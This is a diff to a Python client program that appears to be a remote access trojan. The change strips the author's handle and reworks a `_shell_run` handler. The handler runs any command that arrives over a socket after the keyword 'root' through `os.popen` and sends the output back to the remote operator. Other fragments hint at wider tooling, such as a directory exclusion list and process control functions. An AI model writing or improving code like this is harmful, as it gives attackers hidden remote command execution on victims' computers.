@@ -1,9 +1,3 @@
-'''
-    CookiesKush420#9599
-    github.com/Callumgm
-
-'''
-
 # System Modules
 import os
 import re
@@ -1724,11 +1718,7 @@ def kill_zombie():
 
 #endregion
 
-#endregion
-
-#endregion
-
-
+#region Process Control
 def process_control(id=0):
     process_control.stop=0
     while 1: 
@@ -1741,6 +1731,13 @@ def process_control(id=0):
         if process_control.stop==id:
             process_control.stop=0
             break
+
+#endregion
+
+#endregion
+
+#endregion
+
 
 EXCLUDE_DIRECTORY = (
     'Program Files',
@@ -1816,13 +1813,18 @@ class Client():
     def _shell_run(self, commands):
         global status
         status = None
-        instruction = commands
         def shell(command):
-            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output = os.popen(command).read()
             global status
             status = "ok"
-            return output.stdout.decode('CP437').strip()
-        out = shell(instruction)
+            return output
+        # def shell(command):
+        #     output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        #     global status
+        #     status = "ok"
+        #     return output.stdout.decode('CP437').strip()
+        out = shell(commands)
+        if out == "": out = "No output"
         self.sock.send(str.encode(out))
         status = None
 
@@ -2010,9 +2012,7 @@ class Client():
 
             elif "root" in data:
                 try:
-                    data = data.replace("root ","").split()
-                    commands = str(data[0])
-
+                    commands = data.replace("root ","")
                     self._shell_run(commands)
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
